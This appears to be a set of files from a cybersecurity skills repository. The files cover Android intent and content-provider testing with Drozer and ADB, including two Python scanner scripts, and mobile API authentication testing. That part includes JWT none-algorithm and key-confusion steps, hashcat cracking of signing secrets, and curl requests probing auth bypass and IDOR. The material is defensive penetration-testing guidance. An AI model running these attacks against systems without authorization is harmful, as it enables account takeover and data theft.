### Finding [N]: [COMPONENT_NAME]
- **Type**: [Activity/Service/Receiver/Provider]
- **Exported**: Yes
- **Permission Protected**: [YES/NO]
- **Issue**: [DESCRIPTION]
- **Severity**: [LEVEL]
- **Test Command**: `[COMMAND]`
- **Result**: [OUTCOME]
- **Recommendation**: [REMEDIATION]

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/references/api-reference.md =====
# API Reference: Testing Android Intents for Vulnerabilities

## Drozer Modules

| Module | Description |
|--------|-------------|
| `app.package.attacksurface` | Enumerate exported components |
| `app.activity.info` | List exported activities |
| `app.service.info` | List exported services |
| `app.broadcast.info` | List exported receivers |
| `app.provider.info` | List content providers |
| `app.provider.query` | Query content provider URI |
| `scanner.provider.injection` | Test for SQL injection |
| `scanner.provider.traversal` | Test for path traversal |
| `app.broadcast.send` | Send broadcast intent |
| `app.activity.start` | Start exported activity |

## ADB Intent Commands

| Command | Description |
|---------|-------------|
| `adb shell am start -n <pkg>/<activity>` | Start activity |
| `adb shell am broadcast -a <action>` | Send broadcast |
| `adb shell am startservice -n <pkg>/<svc>` | Start service |
| `adb shell content query --uri <uri>` | Query provider |
| `adb shell dumpsys package <pkg>` | Package info |

## Component Types

| Type | Risk | Test |
|------|------|------|
| Exported Activity | Auth bypass | Direct launch without intent filters |
| Content Provider | Data leakage, SQLi | Query with modified URIs |
| Broadcast Receiver | Action spoofing | Send crafted broadcasts |
| Service | Unauthorized actions | Bind/start with extras |
| PendingIntent | Hijacking | Check FLAG_MUTABLE |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `subprocess` | stdlib | Execute adb/drozer CLI |
| `re` | stdlib | Parse command output |
| `json` | stdlib | Report generation |

## References

- Drozer: https://github.com/WithSecureLabs/drozer
- OWASP MASTG: https://mas.owasp.org/MASTG/
- Android IPC: https://developer.android.com/guide/components/intents-filters

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/references/standards.md =====
# Standards Reference: Android Intent Vulnerabilities

## OWASP Mobile Top 10 2024
| ID | Risk | Intent Relevance |
|----|------|-----------------|
| M4 | Insufficient Input/Output Validation | Intent parameter injection |
| M8 | Security Misconfiguration | Exported components without permission guards |

## OWASP MASVS v2.0 - MASVS-PLATFORM
| Control | Test |
|---------|------|
| MASVS-PLATFORM-1 | Verify exported components require appropriate permissions |
| MASVS-PLATFORM-2 | Verify intent data is validated before processing |

## CWE Mappings
| CWE | Title | Vector |
|-----|-------|--------|
| CWE-926 | Improper Export of Android Application Components | Exported without permission |
| CWE-927 | Use of Implicit Intent for Sensitive Communication | Sensitive data in implicit intents |
| CWE-925 | Improper Verification of Intent by Broadcast Receiver | Missing sender verification |
| CWE-89 | SQL Injection | Content provider query injection |
| CWE-22 | Path Traversal | Content provider path traversal |

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/references/workflows.md =====
# Workflows: Android Intent Vulnerability Testing

## Workflow 1: IPC Security Assessment
```
[Decompile APK] --> [Parse AndroidManifest] --> [Enumerate exported components]
                                                        |
                                     +------------------+------------------+
                                     |          |           |              |
                              [Activities] [Services]  [Receivers]  [Providers]
                              [Direct launch] [Bind/Start] [Trigger] [Query/Inject]
                              [Auth bypass?]  [Data exfil?] [Sniff?] [SQLi? Traversal?]
                                     |          |           |              |
                                     +------------------+------------------+
                                                        |
                                                 [PendingIntent audit]
                                                 [Report findings]
```

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for testing Android intents for vulnerabilities.

Uses ADB and Drozer to enumerate exported components, test
intent injection, content provider SQL injection, broadcast
receiver abuse, and pending intent hijacking vulnerabilities.
"""

import json
import subprocess
import re
import sys
from pathlib import Path
from datetime import datetime


class AndroidIntentTestAgent:
    """Tests Android app IPC through intents for security flaws."""

    def __init__(self, package_name, output_dir="./android_intent_test"):
        self.package = package_name
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _adb(self, args, timeout=15):
        cmd = ["adb", "shell"] + args
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout.strip(), result.returncode
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return "", -1

    def _drozer(self, module, args=""):
        cmd_str = f"run {module} -a {self.package} {args}".strip()
        cmd = ["drozer", "console", "connect", "-c", cmd_str]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.stdout.strip()
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return ""

    def enumerate_attack_surface(self):
        """Enumerate exported components via Drozer."""
        output = self._drozer("app.package.attacksurface")
        surface = {"activities": 0, "services": 0, "receivers": 0, "providers": 0}

        for m in re.finditer(r"(\d+)\s+(activities|broadcast receivers|content providers|services)\s+exported", output):
            count = int(m.group(1))
            comp_type = m.group(2)
            if "activities" in comp_type:
                surface["activities"] = count
            elif "services" in comp_type:
                surface["services"] = count
            elif "receivers" in comp_type:
                surface["receivers"] = count
            elif "providers" in comp_type:
                surface["providers"] = count

        total = sum(surface.values())
        if total > 0:
            self.findings.append({
                "severity": "info",
                "type": "Attack Surface",
                "detail": f"{total} exported components found",
                "breakdown": surface,
            })
        return surface

    def list_exported_activities(self):
        """List exported activities."""
        output = self._drozer("app.activity.info")
        activities = []
        for m in re.finditer(r"([\w.]+/[\w.$]+)", output):
            activities.append(m.group(1))
        return activities

    def test_activity_access(self, activity_name):
        """Test if an exported activity is accessible without auth."""
        output, rc = self._adb(["am", "start", "-n", f"{self.package}/{activity_name}"])
        accessible = "Error" not in output and rc == 0
        if accessible:
            self.findings.append({
                "severity": "high",
                "type": "Exported Activity Access",
                "detail": f"Activity {activity_name} accessible without authentication",
            })
        return {"activity": activity_name, "accessible": accessible, "output": output[:200]}

    def test_content_provider_query(self, uri):
        """Test content provider for data leakage."""
        output = self._drozer("app.provider.query", uri)
        has_data = bool(output) and "No results" not in output and "error" not in output.lower()
        if has_data:
            self.findings.append({
                "severity": "high",
                "type": "Content Provider Data Leakage",
                "detail": f"Data accessible via {uri}",
            })
        return {"uri": uri, "has_data": has_data, "preview": output[:300]}

    def test_sql_injection(self, uri):
        """Test content provider for SQL injection."""
        output = self._drozer("scanner.provider.injection")
        injectable = "Injectable" in output or "injection" in output.lower()
        if injectable:
            self.findings.append({
                "severity": "critical",
                "type": "Content Provider SQL Injection",
                "detail": f"SQL injection possible in {self.package}",
            })
        return {"package": self.package, "injectable": injectable}

    def test_path_traversal(self):
        """Test content providers for path traversal."""
        output = self._drozer("scanner.provider.traversal")
        vulnerable = "Vulnerable" in output or "traversal" in output.lower()
        if vulnerable:
            self.findings.append({
                "severity": "critical",
                "type": "Content Provider Path Traversal",
                "detail": f"Path traversal in {self.package}",
            })
        return {"vulnerable": vulnerable}

    def send_broadcast(self, action, extras=None):
        """Send broadcast to test exported receivers."""
        cmd = ["am", "broadcast", "-a", action, "-p", self.package]
        if extras:
            for key, val in extras.items():
                cmd.extend(["--es", key, val])
        output, rc = self._adb(cmd)
        return {"action": action, "result": output[:200], "returncode": rc}

    def check_debuggable(self):
        """Check if app is debuggable."""
        output, _ = self._adb(["run-as", self.package, "id"])
        debuggable = "uid=" in output
        if debuggable:
            self.findings.append({
                "severity": "high",
                "type": "Debuggable Application",
                "detail": f"{self.package} is debuggable",
            })
        return debuggable

    def generate_report(self):
        surface = self.enumerate_attack_surface()
        activities = self.list_exported_activities()
        self.check_debuggable()
        self.test_sql_injection("")
        self.test_path_traversal()

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "package": self.package,
            "attack_surface": surface,
            "exported_activities": activities,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "android_intent_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <package_name>")
        sys.exit(1)
    agent = AndroidIntentTestAgent(sys.argv[1])
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/testing-android-intents-for-vulnerabilities/scripts/process.py =====
#!/usr/bin/env python3
"""
Android Intent Vulnerability Scanner

Parses AndroidManifest.xml to identify exported components and generate
Drozer/ADB test commands for IPC security assessment.

Usage:
    python process.py --manifest AndroidManifest.xml [--package com.target.app] [--output report.json]
"""

import argparse
import json
import sys
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path


def parse_manifest(manifest_path: str) -> dict:
    """Parse AndroidManifest.xml for exported components."""
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = {"android": "http://schemas.android.com/apk/res/android"}

    package = root.get("package", "unknown")
    target_sdk = ""
    for sdk in root.findall(".//uses-sdk"):
        target_sdk = sdk.get(f"{{{ns['android']}}}targetSdkVersion", "unknown")

    components = {"activities": [], "services": [], "receivers": [], "providers": []}

    for comp_type, tag in [("activities", "activity"), ("services", "service"),
                            ("receivers", "receiver"), ("providers", "provider")]:
        for elem in root.findall(f".//{tag}"):
            name = elem.get(f"{{{ns['android']}}}name", "")
            exported = elem.get(f"{{{ns['android']}}}exported", "")
            permission = elem.get(f"{{{ns['android']}}}permission", "")
            has_intent_filter = len(elem.findall("intent-filter")) > 0

            # Determine effective export status
            if exported == "true":
                is_exported = True
            elif exported == "false":
                is_exported = False
            else:
                is_exported = has_intent_filter  # Default: exported if has intent-filter (pre API 31)

            if is_exported:
                component = {
                    "name": name,
                    "exported": True,
                    "permission": permission,
                    "has_intent_filter": has_intent_filter,
                    "protected": bool(permission),
                }

                # Get intent filter actions
                actions = []
                for intent_filter in elem.findall("intent-filter"):
                    for action in intent_filter.findall("action"):
                        actions.append(action.get(f"{{{ns['android']}}}name", ""))
                component["actions"] = actions

                # Provider-specific attributes
                if tag == "provider":
                    component["authorities"] = elem.get(f"{{{ns['android']}}}authorities", "")
                    component["read_permission"] = elem.get(f"{{{ns['android']}}}readPermission", "")
                    component["write_permission"] = elem.get(f"{{{ns['android']}}}writePermission", "")

                components[comp_type].append(component)

    return {"package": package, "target_sdk": target_sdk, "components": components}


def generate_test_commands(parsed: dict) -> list:
    """Generate Drozer and ADB test commands."""
    commands = []
    pkg = parsed["package"]

    for activity in parsed["components"]["activities"]:
        commands.append({
            "component": activity["name"],
            "type": "activity",
            "tool": "drozer",
            "command": f'run app.activity.start --component {pkg} {activity["name"]}',
            "risk": "HIGH" if not activity["protected"] else "LOW",
        })

    for receiver in parsed["components"]["receivers"]:
        for action in receiver.get("actions", []):
            commands.append({
                "component": receiver["name"],
                "type": "receiver",
                "tool": "adb",
                "command": f'adb shell am broadcast -a {action} -n {pkg}/{receiver["name"]}',
                "risk": "HIGH" if not receiver["protected"] else "LOW",
            })

    for provider in parsed["components"]["providers"]:
        auth = provider.get("authorities", "")
        if auth:
            commands.append({
                "component": provider["name"],
                "type": "provider_query",
                "tool": "drozer",
                "command": f'run app.provider.query content://{auth}/',
                "risk": "CRITICAL" if not provider.get("read_permission") else "MEDIUM",
            })
            commands.append({
                "component": provider["name"],
                "type": "provider_injection",
                "tool": "drozer",
                "command": f'run scanner.provider.injection -a {pkg}',
                "risk": "CRITICAL",
            })

    return commands


def assess_findings(parsed: dict) -> list:
    """Assess security of exported components."""
    findings = []
    components = parsed["components"]

    for comp_type, items in components.items():
        for item in items:
            if not item.get("protected"):
                findings.append({
                    "component": item["name"],
                    "type": comp_type,
                    "issue": f"Exported {comp_type[:-1]} without permission protection",
                    "severity": "HIGH" if comp_type in ("providers", "receivers") else "MEDIUM",
                    "owasp_mobile": "M8",
                    "cwe": "CWE-926",
                })

    # Check for sensitive-looking unprotected components
    sensitive_keywords = ["admin", "debug", "internal", "settings", "config", "payment", "auth"]
    for comp_type, items in components.items():
        for item in items:
            name_lower = item["name"].lower()
            if any(kw in name_lower for kw in sensitive_keywords) and not item.get("protected"):
                findings.append({
                    "component": item["name"],
                    "type": comp_type,
                    "issue": f"Sensitive component '{item['name']}' exported without protection",
                    "severity": "CRITICAL",
                    "owasp_mobile": "M8",
                    "cwe": "CWE-926",
                })

    return findings


def main():
    parser = argparse.ArgumentParser(description="Android Intent Vulnerability Scanner")
    parser.add_argument("--manifest", required=True, help="AndroidManifest.xml path")
    parser.add_argument("--output", default="intent_scan.json", help="Output report")
    args = parser.parse_args()

    if not Path(args.manifest).exists():
        print(f"[-] Not found: {args.manifest}")
        sys.exit(1)

    parsed = parse_manifest(args.manifest)
    commands = generate_test_commands(parsed)
    findings = assess_findings(parsed)

    total_exported = sum(len(v) for v in parsed["components"].values())

    report = {
        "scan": {"manifest": args.manifest, "package": parsed["package"],
                 "target_sdk": parsed["target_sdk"], "date": datetime.now().isoformat()},
        "attack_surface": {
            "total_exported": total_exported,
            "activities": len(parsed["components"]["activities"]),
            "services": len(parsed["components"]["services"]),
            "receivers": len(parsed["components"]["receivers"]),
            "providers": len(parsed["components"]["providers"]),
        },
        "findings": findings,
        "test_commands": commands,
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    print(f"[+] Package: {parsed['package']}")
    print(f"[+] Exported components: {total_exported}")
    print(f"[+] Findings: {len(findings)}")
    print(f"[+] Test commands generated: {len(commands)}")
    print(f"[+] Report saved: {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/SKILL.md =====
---
name: testing-mobile-api-authentication
description: 'Tests authentication and authorization mechanisms in mobile application
  APIs to identify broken authentication, insecure token management, session fixation,
  privilege escalation, and IDOR vulnerabilities. Use when performing API security
  assessments against mobile app backends, testing JWT implementations, evaluating
  OAuth flows, or assessing session management. Activates for requests involving mobile
  API auth testing, token security assessment, OAuth mobile flow testing, or API authorization
  bypass.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- api-security
- authentication
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1068
---
# Testing Mobile API Authentication

## When to Use

Use this skill when:
- Assessing mobile app backend API authentication during penetration tests
- Testing JWT token implementation for common vulnerabilities (none algorithm, weak signing)
- Evaluating OAuth 2.0 / OIDC flows in mobile applications for redirect, PKCE, and scope issues
- Testing for broken object-level authorization (BOLA/IDOR) in API endpoints

**Do not use** this skill against production APIs without explicit authorization and rate-limiting awareness.

## Prerequisites

- Burp Suite or mitmproxy configured as mobile device proxy
- SSL pinning bypassed on target application (if implemented)
- Valid test account credentials for the target application
- Postman or curl for API request crafting
- jwt.io or PyJWT for JWT analysis and manipulation

## Workflow

### Step 1: Map Authentication Endpoints

Intercept mobile app traffic to identify authentication-related endpoints:

```
POST /api/v1/auth/login          - Initial authentication
POST /api/v1/auth/register       - Account registration
POST /api/v1/auth/refresh        - Token refresh
POST /api/v1/auth/logout         - Session termination
POST /api/v1/auth/forgot-password - Password reset
POST /api/v1/auth/verify-otp     - OTP verification
GET  /api/v1/auth/me             - Authenticated user profile
```

### Step 2: Analyze Token Format and Security

**JWT Analysis:**
```bash
# Decode JWT without verification
echo "eyJhbGciOiJIUzI1NiIs..." | cut -d. -f2 | base64 -d 2>/dev/null

# Check for common JWT vulnerabilities:
# 1. None algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature: header.payload.

# 2. Algorithm confusion (RS256 to HS256)
# If server uses RS256, try HS256 with public key as secret

# 3. Weak signing key
# Use hashcat or jwt-cracker to brute-force HMAC secret
hashcat -m 16500 jwt.txt wordlist.txt

# 4. Expiration bypass
# Modify "exp" claim to future timestamp
```

**Opaque Token Analysis:**
```
- Test token length and entropy
- Check if tokens are sequential/predictable
- Test token reuse after logout
- Verify token invalidation on password change
```

### Step 3: Test Authentication Bypass

```bash
# Test missing authentication
curl -X GET https://api.target.com/api/v1/users/profile

# Test with empty/null token
curl -X GET https://api.target.com/api/v1/users/profile \
  -H "Authorization: Bearer "

curl -X GET https://api.target.com/api/v1/users/profile \
  -H "Authorization: Bearer null"

# Test with expired token (should fail)
curl -X GET https://api.target.com/api/v1/users/profile \
  -H "Authorization: Bearer <expired_token>"

# Test token from different user
curl -X GET https://api.target.com/api/v1/users/123/profile \
  -H "Authorization: Bearer <user_456_token>"
```

### Step 4: Test IDOR / Broken Object-Level Authorization

```bash
# Change user ID in request path
curl -X GET https://api.target.com/api/v1/users/123/orders \
  -H "Authorization: Bearer <user_456_token>"

# Change object ID in request body
curl -X PUT https://api.target.com/api/v1/orders/789 \
  -H "Authorization: Bearer <user_456_token>" \
  -d '{"status": "cancelled"}'

# Test horizontal privilege escalation
# Access admin endpoints with regular user token
curl -X GET https://api.target.com/api/v1/admin/users \
  -H "Authorization: Bearer <regular_user_token>"
```

### Step 5: Test Session Management

```bash
# Test concurrent sessions
# Login from multiple devices simultaneously - should both remain valid?

# Test session invalidation after logout
TOKEN=$(curl -s -X POST https://api.target.com/api/v1/auth/login \
  -d '{"email":"test@test.com","password":"pass"}' | jq -r '.token')

# Logout
curl -X POST https://api.target.com/api/v1/auth/logout \
  -H "Authorization: Bearer $TOKEN"

# Try using the same token (should fail)
curl -X GET https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN"

# Test session invalidation after password change
# Token obtained before password change should be invalidated
```

### Step 6: Test OAuth 2.0 / OIDC Mobile Flows

```bash
# Test for authorization code interception
# Check if PKCE (Proof Key for Code Exchange) is enforced
# Test with missing code_verifier parameter

# Test redirect URI manipulation
# Try custom scheme hijacking: myapp://callback
# Test with modified redirect_uri parameter

# Test scope escalation
# Request higher privileges than granted
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **BOLA/IDOR** | Broken Object Level Authorization - accessing resources by changing identifiers without server-side authorization checks |
| **JWT** | JSON Web Token - self-contained authentication token with header, payload, and signature components |
| **PKCE** | Proof Key for Code Exchange - OAuth 2.0 extension preventing authorization code interception in mobile apps |
| **Token Refresh** | Mechanism for obtaining new access tokens using long-lived refresh tokens without re-authentication |
| **Session Fixation** | Attack where adversary sets a known session ID before victim authenticates, then hijacks the session |

## Tools & Systems

- **Burp Suite**: HTTP proxy for intercepting and modifying authentication requests
- **jwt_tool**: Python tool for testing JWT vulnerabilities (none algorithm, key confusion, claim manipulation)
- **Postman**: API testing client for crafting authentication requests
- **hashcat**: Password/JWT secret cracking tool for testing HMAC signing key strength
- **Autorize**: Burp Suite extension for automated authorization testing

## Common Pitfalls

- **Rate limiting masks issues**: API may rate-limit test requests. Use delays between requests and test from the tester's authorized perspective first.
- **Token in URL**: Some mobile APIs pass tokens in URL query parameters, exposing them in server logs and browser history. Flag as finding even if authorization works correctly.
- **Refresh token rotation**: Some APIs rotate refresh tokens on each use. If your test invalidates the refresh token, you may lock out your test account.
- **Mobile-specific OAuth**: Mobile apps use custom URI schemes for OAuth redirects, which can be intercepted by malicious apps registered for the same scheme.

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/assets/template.md =====
# Mobile API Authentication Test Report

## Target
| Field | Value |
|-------|-------|
| API Base URL | [URL] |
| Application | [APP_NAME] |
| Token Type | [JWT/OAuth/Opaque] |
| Test Date | [DATE] |

## JWT/Token Analysis
| Check | Result | Severity |
|-------|--------|----------|
| Algorithm | [ALG] | [SEVERITY] |
| Expiration | [DURATION] | [SEVERITY] |
| Sensitive Claims | [YES/NO] | [SEVERITY] |
| Signing Key Strength | [WEAK/STRONG] | [SEVERITY] |

## Authentication Tests
| Test | Endpoint | Result | Severity |
|------|----------|--------|----------|
| Missing Auth | [ENDPOINT] | [PASS/FAIL] | [SEVERITY] |
| Expired Token | [ENDPOINT] | [PASS/FAIL] | [SEVERITY] |
| Empty Token | [ENDPOINT] | [PASS/FAIL] | [SEVERITY] |

## Authorization Tests (IDOR)
| Endpoint | Own ID | Other ID | Accessible | Severity |
|----------|--------|----------|-----------|----------|
| [ENDPOINT] | [ID] | [ID] | [YES/NO] | [SEVERITY] |

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/references/api-reference.md =====
# API Reference: Testing Mobile API Authentication

## Common Mobile Auth Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| /api/v1/login | POST | Username/password authentication |
| /api/v1/register | POST | New account creation |
| /api/v1/token | POST | OAuth token exchange |
| /api/v1/refresh | POST | Token refresh flow |
| /api/v1/logout | POST | Session termination |
| /api/v1/verify-otp | POST | MFA code verification |
| /api/v1/me | GET | Current user profile |

## Mobile-Specific JWT Claims

| Claim | Purpose | Security Impact |
|-------|---------|-----------------|
| device_id / did | Bind token to device | Prevents token theft across devices |
| platform | iOS/Android identifier | Enables platform-specific policy |
| app_version | Client version tracking | Version-gated feature access |
| exp | Token expiration | Missing = permanent access |

## Test Categories

| Test | Severity | Description |
|------|----------|-------------|
| No auth access | Critical | Endpoints accessible without token |
| IDOR | Critical | Access other users' resources |
| Weak JWT secret | Critical | Brute-force HMAC signing key |
| Token reuse after logout | High | Token valid after logout |
| No rate limiting | High | Unlimited login attempts |
| Missing device binding | Medium | Token works on any device |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `requests` | >=2.28 | HTTP API testing |
| `base64` | stdlib | JWT decoding |
| `hmac` | stdlib | HMAC signature verification |
| `hashlib` | stdlib | Hash functions for JWT |

## References

- OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/
- OWASP API Security Top 10: https://owasp.org/API-Security/
- MASVS Authentication: https://mas.owasp.org/MASVS/05-MASVS-AUTH/

===== END FILE =====


===== FILE: skills/testing-mobile-api-authentication/references/standards.md =====
# Standards Reference: Mobile API Authentication Testing

## OWASP Mobile Top 10 2024

| OWASP ID | Risk | Testing Focus |
|----------|------|---------------|
| M1 | Improper Credential Usage | Hardcoded API keys, credential transmission |
| M3 | Insecure Authentication/Authorization | Auth bypass, IDOR, privilege escalation |

## OWASP API Security Top 10 2023

| API Risk | Test Case |
|----------|-----------|
| API1: Broken Object Level Authorization | Modify object IDs, test cross-user access |
| API2: Broken Authentication | JWT vulnerabilities, token replay, session management |
| API3: Broken Object Property Level Auth | Mass assignment, property-level access |
| API5: Broken Function Level Authorization | Admin endpoint access with user tokens |

## OWASP MASVS v2.0 - MASVS-AUTH

| Control | Test Method |
|---------|-------------|
| MASVS-AUTH-1 | Verify authentication enforcement on all sensitive endpoints |
| MASVS-AUTH-2 | Test token generation, validation, and revocation |
| MASVS-AUTH-3 | Assess multi-factor authentication implementation |

## CWE Mappings

| CWE | Title | Test |
|-----|-------|------|
| CWE-287 | Improper Authentication | Missing auth on endpoints |
| CWE-639 | Authorization Bypass Through User-Controlled Key | IDOR testing |
